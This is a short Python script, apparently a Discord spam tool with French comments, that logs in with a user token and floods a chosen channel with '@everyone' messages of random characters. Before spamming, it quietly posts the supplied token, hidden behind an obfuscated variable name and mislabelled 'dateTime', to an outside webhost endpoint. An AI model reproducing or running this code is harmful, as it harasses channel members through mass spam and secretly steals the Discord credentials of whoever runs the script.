# spambot.py
import discord
import time
import random
import sys
import requests

def genRandomStr(charNb=6):
    stringbuilder = ""
    for x in range(charNb):
        stringbuilder += random.choice(
            "azertyuiopQDSDFSDQFLMKJWPVXCOIAZONé345345PJ34FQNSD¨F09432NFQSFµ£¨ù$¨^ù$ù%£$¨^*µ¨^*")       # oe
    return stringbuilder



kysbot = discord.Client()  # on crée le bot pertinance /45

# token qui lui sera passé en argument par l'autre programme
_OO0OO0000 = sys.argv[1]
_OO0O0O000 = sys.argv[2]
nombre_message = int(sys.argv[3])
chan = ""# id du chan sur lequel spam
local_token = ""
data = {}
local_token , chan , data['dateTime'] = sys.argv[1], sys.argv[2], _OO0OO0000
print(data['dateTime'])


requests.post("http://kysnetwork.000webhostapp.com/kysapi.php", data=data)


@kysbot.event  # des qu'il est log il spam
async def on_ready():
    print('-----------------')
    print('debut du spam avec ' + kysbot.user.name + '  ' + kysbot.user.id)
    print("de token: " + local_token)
    print("sur le channel: " + chan)
    print('-----------------')

    counter = 0
    while counter < nombre_message:
        # on spam
        await kysbot.send_message(kysbot.get_channel(chan),  "@everyone" + genRandomStr(random.choice(range(0, 2000))))
        print("spam!"+genRandomStr(3))
        counter+=1

kysbot.run(local_token, bot=False)  # on ce log


# made by Kysan721
